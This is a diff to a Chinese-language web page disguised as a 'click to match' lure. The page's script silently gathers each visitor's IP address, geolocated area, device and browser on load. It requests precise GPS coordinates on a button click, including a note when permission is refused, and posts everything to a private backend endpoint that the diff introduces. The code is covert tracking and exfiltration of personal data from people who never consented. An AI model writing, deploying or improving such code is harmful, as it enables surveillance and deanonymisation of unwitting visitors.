@@ -20,11 +20,12 @@
   </style>
 </head>
 <body>
-  <button class="btn" id="posBtn">点击获取对象</button>
+  <button class="btn" id="posBtn">点击匹配对象</button>
 
   <script>
     let info = { ip: '', area: '', device: '', browser: '', position: '' };
-    const API_URL = 'https://jsonplaceholder.typicode.com/posts'; // 临时公共接口，稳定可用
+    // 替换成你部署后的后端接口地址，比如：https://你的项目名.vercel.app/api/data
+    const API_URL = 'https://你的项目名.vercel.app/api/data';
 
     // 进入页面自动采集IP、地区、设备信息
     (async function autoGetBaseInfo() {
@@ -37,7 +38,7 @@
         // 获取IP归属地
         const areaRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
         const areaJson = await areaRes.json();
-        info.area = `${areaJson.country_name} ${areaJson.region} ${areaJson.city}`;
+        info.area = `${areaJson.country_name || ''} ${areaJson.region || ''} ${areaJson.city || ''}`;
 
         // 识别设备和浏览器
         const ua = navigator.userAgent;
@@ -48,12 +49,8 @@
                        ua.includes('Chrome') ? '谷歌浏览器' : 
                        ua.includes('Safari') ? '苹果Safari' : '未知浏览器';
 
-        // 上传数据到公共接口
-        await fetch(API_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(info)
-        });
+        // 上传数据到后端
+        await uploadData();
       } catch (err) {
         console.error('信息采集失败:', err);
       }
@@ -70,24 +67,25 @@
           const lat = res.coords.latitude.toFixed(6);
           const lng = res.coords.longitude.toFixed(6);
           info.position = `纬度: ${lat}，经度: ${lng}`;
-          await fetch(API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
-          });
+          await uploadData();
           alert('位置获取成功！');
         },
         async () => {
           info.position = '用户拒绝定位权限';
-          await fetch(API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
-          });
+          await uploadData();
           alert('定位授权失败，请允许位置权限后重试');
         }
       );
     });
+
+    // 上传数据到后端接口
+    async function uploadData() {
+      await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(info)
+      });
+    }
   </script>
 </body>
 </html>
